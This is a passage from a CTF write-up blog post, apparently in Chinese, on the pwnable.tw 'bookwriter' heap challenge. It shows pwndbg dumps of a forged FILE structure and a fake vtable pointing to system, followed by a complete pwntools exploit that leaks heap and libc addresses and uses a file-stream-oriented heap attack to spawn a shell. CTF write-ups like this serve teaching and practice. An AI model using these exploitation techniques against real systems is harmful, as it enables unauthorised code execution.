class="number">0x7f7ba0e30bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x7f7ba0e30bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _markers = <span class="number">0x102c2c0</span>, </span><br><span class="line">    _chain = <span class="number">0x102c2c0</span>, </span><br><span class="line">    _fileno = <span class="number">-1595733032</span>, </span><br><span class="line">    _flags2 = <span class="number">32635</span>, </span><br><span class="line">    _old_offset = <span class="number">140168956939224</span>, </span><br><span class="line">    _cur_column = <span class="number">3048</span>, </span><br><span class="line">    _vtable_offset = <span class="number">-29</span> <span class="string">&#x27;\343&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;\240&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7f7ba0e30be8</span> &lt;main_arena+<span class="number">200</span>&gt;, </span><br><span class="line">    _offset = <span class="number">140168956939256</span>, </span><br><span class="line">    _codecvt = <span class="number">0x7f7ba0e30bf8</span> &lt;main_arena+<span class="number">216</span>&gt;, </span><br><span class="line">    _wide_data = <span class="number">0x7f7ba0e30c08</span> &lt;main_arena+<span class="number">232</span>&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x7f7ba0e30c08</span> &lt;main_arena+<span class="number">232</span>&gt;, </span><br><span class="line">    _freeres_buf = <span class="number">0x7f7ba0e30c18</span> &lt;main_arena+<span class="number">248</span>&gt;, </span><br><span class="line">    __pad5 = <span class="number">140168956939288</span>, </span><br><span class="line">    _mode = <span class="number">-1595732952</span>, </span><br><span class="line">    _unused2 = <span class="string">&quot;&#123;\177\000\000(\f\343\240&#123;\177\000\000\070\f\343&quot;</span>...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f7ba0e30c38</span> &lt;main_arena+<span class="number">280</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//bins</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x102c2c0</span> —▸ <span class="number">0x7f7ba0e30bc8</span> (main_arena+<span class="number">168</span>) ◂— <span class="number">0x102c2c0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x102c2c0</span>				<span class="comment">//fakefile2</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7f7ba0e30bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f7ba0e30bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x102c3a0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//伪造的vtable</span></span><br><span class="line">pwndbg&gt; p *(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *) <span class="number">0x102c3a0</span></span><br><span class="line">$<span class="number">8</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x1</span>, </span><br><span class="line">  __overflow = <span class="number">0x7f7ba0ab13a0</span> &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x0</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下面要考虑的就是如何出发伪造的 vtable。首先我们这里的 fakefile2 取代了 stdout，所以当程序报错的输出信息时，会调用 over_flow，我们在伪造的 vtable 对应位置写入 system。</p>
+<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line">cnt = <span class="number">0x602040</span></span><br><span class="line">name = <span class="number">0x602060</span>				<span class="comment">#size=64</span></span><br><span class="line">gp = <span class="number">0x6020A0</span>				</span><br><span class="line">gs = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thename</span>(<span class="params">text</span>):</span><br><span class="line">	r.sendafter(<span class="string">&quot;Author :&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Size of page :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content :&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index of page :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index of page :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">updatename</span>(<span class="params">i,name=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,i)</span><br><span class="line">	<span class="keyword">if</span> i==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">		thename(name)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b malloc&#x27;</span>)</span><br><span class="line">thename(<span class="string">b&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#now the size0 is 0x20+3,wocan overflow 3 bytes</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0xfe1</span>)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">ch(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x50</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line">list_all = <span class="number">0x3c5520</span>+libcbase</span><br><span class="line">system =libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_arena : &quot;</span>,<span class="built_in">hex</span>(main_arena))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">onegadget = <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fakechunk =b&#x27;\x00&#x27;*0x2b0</span></span><br><span class="line"><span class="string">pad =b&#x27;/bin/sh\x00&#x27;+p64(0x61)</span></span><br><span class="line"><span class="string">pad+= p64(main_arena) +p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class="line"><span class="string">pad =pad.ljust(0xc0,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string">pad +=p64(0xffffffffffffffff)</span></span><br><span class="line"><span class="string">pad = pad.ljust(0xd8,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string">vtable  = heap_addr+0x10+0x2b0 + 0xd8 + 0x8</span></span><br><span class="line"><span class="string">pad += p64(vtable)</span></span><br><span class="line"><span class="string">fake_vtable = p64(0)*2+p64(1)+p64(system)</span></span><br><span class="line"><span class="string">fakechunk+=pad+fake_vtable</span></span><br><span class="line"><span class="string">edit(0,fakechunk)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(main_arena)+p64(list_all-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> + <span class="number">0xd8</span> + <span class="number">0x8</span>+<span class="number">0x10</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line">ch(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Size of page :&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-04-11 18:30:04" itemprop="dateModified" datetime="2022-04-11T18:30:04+08:00">2022-04-11</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/04/10/pwnable-bookwriter/" title="">http://example.com/2022/04/10/pwnable-bookwriter/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/04/01/tcache-tear/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevuctzzj20zk0m84qp.jpg" title="tcache_tear">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>tcache_tear</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/04/14/heap-paradise/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeu1usa7j20zk0m8b29.jpg" title="heap_paradise">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>heap_paradise</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnabletw"><span class="toc-number">1.</span> <span class="toc-text"> pwnable.tw	bookwriter			ubuntu16,libc 2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 保护：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text"> 主要代码：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text"> main 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readname%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text"> readname 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#menu%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text"> menu 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text"> add 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#info%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text"> info 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.6.</span> <span class="toc-text"> edit 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatename%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text"> updatename 函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text"> 思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text"> exp</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li class="active"><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/04/01/tcache-tear/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/04/14/heap-paradise/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/20/ciscn-2022-planecoode/" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="滴水逆向_学习笔记">滴水逆向_学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/21/ciscn-2022-whatheap/" title="ciscn_2022_whatheap">ciscn_2022_whatheap</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/23/test/" title="test">test</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/19/pwnable-seethefile/" title="pwnable_seethefile">pwnable_seethefile</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/05/10/chunzhiIOT/" title="chunzhiIOT">chunzhiIOT</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/14/heap-paradise/" title="heap_paradise">heap_paradise</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/19/ciscn-2022-popcalc/" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/18/ciscn2022-syscall/" title="ciscn2022_syscall">ciscn2022_syscall</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/19/starctf-babynote/" title="starctf_babynote">starctf_babynote</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/04/10/pwnable-bookwriter/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
